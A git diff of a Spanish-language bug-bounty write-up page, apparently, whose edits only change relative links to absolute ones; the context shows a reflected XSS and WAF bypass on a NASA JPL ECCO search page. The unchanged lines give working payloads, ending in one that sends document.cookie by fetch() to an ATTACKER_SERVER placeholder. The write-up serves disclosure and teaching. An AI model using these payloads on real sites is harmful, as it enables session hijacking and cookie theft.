@@ -4,7 +4,7 @@ layout: default
 
 <div class="container">
 <article>
-  <a href="../../../es/" class="back-btn">
+  <a href="/es/" class="back-btn">
     <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
     {{ site.title }}
   </a>
@@ -19,52 +19,52 @@ layout: default
     <p>Como en cualquier programa de bug bounty, lo primero que hicimos fue usar la página como lo haría cualquier usuario normal. El campo de búsqueda destacó a primera vista, por lo que decidimos probarlo.</p>
     <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></pre>
     <p>Aquí es donde nos dimos cuenta de que el valor que estábamos agregando se reflejaba en el sitio web.</p>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Búsqueda Normal">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Búsqueda Normal">
     <p>Decidimos inspeccionar cuidadosamente el código fuente del sitio web y nos dimos cuenta de que nuestra entrada estaba dentro de una función <code>console.log()</code>.</p>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal Result.png" alt="Resultado de Búsqueda Normal">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal Result.png" alt="Resultado de Búsqueda Normal">
 
     <h2>🛡️ Etiqueta &lt;script&gt; deshabilitada</h2>
     <p>Realizamos algunas pruebas básicas que se llevan a cabo para intentar detectar ataques XSS:</p>
     <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
     <p>Todo lo que obtuvimos fue que el Firewall de Aplicaciones Web (WAF) rechazó nuestras solicitudes ante el más mínimo signo de actividad maliciosa.</p>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Bloqueado por el WAF">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Script Tag.png" alt="Bloqueado por el WAF">
 
     <h2>🔧 Cerrar la cadena de console.log de Javascript</h2>
     <p>Basándonos en nuestro descubrimiento inicial, decidimos intentar cerrar <code>console.log()</code> para insertar código justo después de él utilizando el siguiente payload:</p>
     <pre><code>pwn');</code></pre>
     <p>Insertamos <code>')</code> inmediatamente después de una cadena de texto, que es lo que JavaScript necesitaba para cerrar <code>console.log()</code>. Sin embargo, el símbolo de punto y coma <code>;</code> no se mostraba.</p>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Cerrando console.log">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Cerrando console.log">
 
     <h2>🧱 Anexar Javascript (Bypass)</h2>
     <p>Para que funcionara y empezar a inyectar código, tuvimos que codificar el punto y coma en formato HTML, cambiándolo de <code>;</code> a <code>%3b</code>.</p>
     <pre><code>pwn')%3balert(1)</code></pre>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Bypass Semicollon.png" alt="Bypass del Punto y Coma">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Bypass Semicollon.png" alt="Bypass del Punto y Coma">
 
     <h2>💥 Primera Alerta (Funcionando)</h2>
     <p>Aunque el WAF no aceptaba la etiqueta <code>&lt;script&gt;</code>, logramos que renderizara la etiqueta <code>&lt;/script&gt;</code>, lo cual fue suficiente para llevar a cabo un ataque XSS REFLEJADO.</p>
     <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">
 
     <h2>🕵️ Bypass del Firewall para Cookies</h2>
     <p>El WAF rechazaba cadenas como <code>document.cookie</code>. Para lograr un bypass efectivo del WAF, creamos una variable <code>a</code> que contenía <code>document</code>, y solicitamos <code>cookie</code> desde esa variable.</p>
     <pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Alert.png" alt="Alerta de Document Cookie">
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Result.png" alt="Resultado de Document Cookie">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Alert.png" alt="Alerta de Document Cookie">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Result.png" alt="Resultado de Document Cookie">
 
     <h2>🚀 Exploit Final (Exfiltración de Cookies)</h2>
     <p>En lugar de ejecutar <code>alert</code>, ejecutamos <code>fetch</code> para enviar una solicitud a un servidor controlado por el atacante.</p>
     <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Exploit Final">
-    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Petición de Exfiltración">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Exploit Final">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Petición de Exfiltración">
 
     <h2>📜 Reconocimiento Oficial</h2>
     <div class="pdf-container">
-      <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
+      <iframe src="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf#toolbar=0&navpanes=0&scrollbar=0" width="100%" height="100%" style="border: none;"></iframe>
     </div>
     
     <div style="text-align: center; margin-top: 1rem;">
-      <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
+      <a href="/assets/others/nasa-jpl-ecco-xss-waf-bypass/acknowledgment.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
     </div>
 
     <h2>🤝 Detalle de Colaboración</h2>
